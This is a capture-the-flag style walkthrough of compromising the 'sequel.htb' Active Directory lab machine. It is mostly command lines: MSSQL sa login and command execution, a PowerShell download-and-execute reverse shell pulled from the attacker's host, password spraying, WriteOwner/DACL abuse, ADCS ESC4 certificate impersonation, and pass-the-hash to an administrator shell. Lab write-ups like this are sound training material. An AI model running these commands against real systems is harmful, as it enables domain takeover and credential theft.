we're given with the creds of rose:KxEPkKe6R8su
Looking around, we enumerate rpc for users, and find them.
None of them, of course asrep or kerberoast

`nxc mssql 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'` --we get authenticated
So we try running a command using -x
`nxc sql 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' -x whoami`
But nothing works

`nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares --timeout 30 --smb-timeout 10` -- we get authenticated, and we see shares
rose has access to "Accounting Departmet" share on smb
`smbclient -U rose -p 'KxEPkKe6R8su' \\\\10.129.232.128\\"Accounting Department"`
We find accounting and accounts, two xlsx files
doing `file filename` shows it is a compressed file, so
`unzip accounting.xlsx`
There's a bunch of files deflated, we find a sharedString.xml file
There, we see username-passwords for kevin, oscar, angela, sa
sa sticks out, so we try authenticating with nxc mssql

---
`nxc mssql dc01.sequel.htb -u 'sa' -p 'MSSQLP@ssw0rd!'`
fails, it asks us to auth with --local auth
`nxc mssql dc01.sequel.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth`
pwn3d, so we run a command to see if that works
`nxc mssql dc01.sequel.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -x whoami`
gives us command execution capabilities

copy nishang's oneliner powershell, call it rshell.ps1, open python server, start listening
`nxc mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.45/rshell.ps1')"`

---
Here, we see a configuration file sql-Configuration.INI, and a new password
WqSZAF6CysDQbGb3
We spray this on smb for the discovered users.
`nxc smb dc01.sequel.htb -u users.txt -p WqSZAF6CysDQbGb3 --continue-on-success`
we see it works for ryan AND sql_svc

we send over the sharphound ingestor to ryan's terminal
`./SharpHound.exe -c All`

Looking over the data, we load a query for "Shortest Path from Owned objects" we see Ryan has "WriteOwner" on ca_svc, which is a member of CERT_PUBLISHERS using which we can perform ADCS ESC4 attack!

We try to directly use certipy shadow, but it says we dont have sufficient access rights
`certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128` --INSUFFICIENT_RIGHTS

---
So, we need to own ca_svc account first, using owneredit.
This is only possible cuz we have "WriteOwner"
`impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3`
The shadow still wont work, because even though we are owner of ca_svc, we still dont have access to write objects. we use dacledit for that
`impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3`
Now we run the certipy shadow
`certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128`
we get the NTLM hash for the user ca_svc
==NOTE== - time is of the essence, run the code in quick succession. (had to do owneredit and dacledit twice for it to work)

Now, we have access to misconfigure a certificate setting a few things like changing False to True on "Enrollee supplies subject" , so we can pretend to be admin, get a certificate, and use that certificate to authenticate as the admin. This is called ESC4

`certipy-ad find -u 'ca_svc' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -stdout -vulnerable`
shows us the template DunderMufflinAuthentication, which is vulnerable to ESC4
To misconfigure it, -write-default-configuration sets the configs to default of ESC1
`certipy-ad template -u 'ca_svc' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -write-default-configuration`

Now, we run certipy req to impersonate admin and get the pfx
`certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb`

Now, certipy auth to authenticate as administrator to the ca, and get the admin hash
`certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128`

Finally, get the admin shell
`impacket-psexec -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff administrator@10.129.232.128`

---
---
---
Way to go From Ryan to ca_svc using PowerView.ps1
```powershell
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```